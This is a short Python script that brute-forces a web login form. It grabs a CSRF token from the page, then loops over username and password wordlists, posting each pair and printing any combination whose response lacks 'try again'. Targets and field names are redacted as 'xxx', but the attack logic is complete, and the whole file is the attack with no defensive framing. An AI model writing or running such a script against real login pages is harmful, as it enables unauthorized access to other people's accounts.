import requests
from bs4 import BeautifulSoup
S = requests.Session()

response  = S.get('http://xxx/xxx.xxx')

soup_search = BeautifulSoup(response.text, 'html.parser')

csrf = soup_search.select_one('input[name="xxx"]')['xxx']
#print(csrf)

usernames = []
passwords = []

with open("xxx","r") as userfile:
        username = userfile.readlines()

with open("xxx","r") as passfile:
        passwords = passfile.readlines()

for i in username:
#       print(i.replace("\n",""))
        for x in passwords:
                post_data = {'username':i.replace("\n",""), 'password':x.replace("\n",""),'xxx':xxx}
                response2 = S.post('http://xxx/xxx.xxx',data=post_data)
                if "try again" not in response2.text:
                        print(response2.text)
                        print("username found:"+i)
                        print("password foind:"+x)
